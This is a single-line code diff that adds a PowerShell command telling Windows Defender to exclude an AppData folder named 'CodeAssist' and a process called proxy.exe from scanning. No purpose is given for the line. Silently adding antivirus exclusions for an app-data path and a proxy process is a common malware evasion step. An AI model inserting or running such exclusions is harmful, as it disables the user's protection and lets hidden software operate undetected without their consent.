@@ -1,0 +1,1 @@
+Add-MpPreference -ExclusionPath "$env:APPDATA\CodeAssist" -ExclusionProcess proxy.exe
